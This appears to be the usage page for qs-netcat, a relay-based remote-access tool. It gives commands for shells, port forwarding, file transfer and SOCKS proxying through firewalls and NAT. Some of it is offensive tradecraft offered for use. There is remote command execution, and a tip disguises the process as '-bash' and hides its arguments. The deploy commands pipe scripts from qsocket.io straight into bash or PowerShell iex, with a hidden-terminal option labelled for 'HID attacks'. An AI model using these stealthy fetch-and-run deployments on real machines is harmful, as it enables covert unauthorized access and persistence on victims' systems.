---
title: 'Examples'
toc: false
---

# Usage Examples

---

<div align="center">
  <video width="1024" height="800" controls>
    <source src="https://user-images.githubusercontent.com/17179401/221196823-5c6e3a66-3b06-410a-9d2b-33efd101428a.mp4" type="video/mp4">
  </video>
</div> 

---

<details>
<summary>RDP connection over QSRN</summary>

<video width="760" height="500" controls>
  <source src="https://github.com/qsocket/qs-netcat/assets/17179401/af46c8fb-cb33-483a-b5c1-9142843da2bd" type="video/mp4">
</video>
</details>

<details>
<summary>ADB access over QSRN</summary>

<video width="760" height="500" controls>
  <source src="https://user-images.githubusercontent.com/17179401/216651601-6ddc8ddf-7248-4c2b-bd77-00f00f773c80.mov" type="video/mp4">
</video>
</details>

**Usage:**

- Log in to Workstation A from Workstation B through any firewall/NAT
```bash
qs-netcat -l -i   # Workstation A
qs-netcat -i      # Workstation B
```

- SSH from *Workstation A* to *Workstation B* by port forwarding through any firewall/NAT
```bash
qs-netcat -l                    # Workstation B
qs-netcat -f "22:localhost:22"  # Workstation A
ssh user@localhost              # Workstation A
```

- Transfer files from *Workstation B* to *Workstation A* using smart pipes
```bash
qs-netcat -s MySecret -l > file.txt     # Workstation A
qs-netcat -s MySecret < file.txt        # Workstation B
```

- Port forward. Access 192.168.6.7:80 on Workstation A's private LAN from Workstation B:
```bash
qs-netcat -l                  # Workstation A
qs-netcat -f 192.168.6.7:80   # Workstation B
```

- Execute any command (nc -e style) on *Workstation A*
```bash
qs-netcat -l                         # Workstation A
qs-netcat -e "echo hello_world; id"  # Workstation B
```
- Access entirety of Workstation A's private LAN (Sock4/4a/5 proxy)
```bash
qs-netcat -l                    # Workstation A
qs-netcat -f "22:localhost:22"  # Workstation B
ssh -D 9090 root@localhost      # Workstation B
# Access www.google.com via Workstation A's private LAN from your Workstation B:
curl --socks4a 127.1:9090 http://www.google.com
```

- Mount a remote folder of Workstation A using sshfs and qs-netcat
```bash
qs-netcat -l                    # Workstation A
qs-netcat -f "22:localhost:22"  # Workstation B
sudo sshfs -o allow_other,default_permissions root@localhost:/remote_dir /mnt/local_dir # Workstation B
```

**Pro Tips**
- Hide your arguments (argv)

Pass the arguments by environment variable (QS_ARGS) and use a bash-trick to hide qs-netcat binary in the process list:
```bash
export QS_ARGS="-s MySecret -l -i -q"
exec -a -bash ./qs-netcat &     # Hide as '-bash'.
ps alxww | grep qs-netcat
ps alxww | grep -bash
#  1001 47255     1   0  26  5  4281168    436 -      SNs    ??    0:00.00 -bash
```

# Deploy Examples

#### Deploy with a spesific secret value

```bash
S="MySecret" curl -fsSL qsocket.io/0 | bash # For *nix
```
```powershell
$Env:S="MySecret"; irm qsocket.io/1 | iex  # For Windows
```
#### Hide Terminal During Deploymeny
This option can be usefull during HID attacks.

```bash
HIDE=1 curl -fsSL qsocket.io/0 | bash # For \*nix
```
```powershell
$Env:HIDE=1; irm qsocket.io/1 | iex # For Windows
```
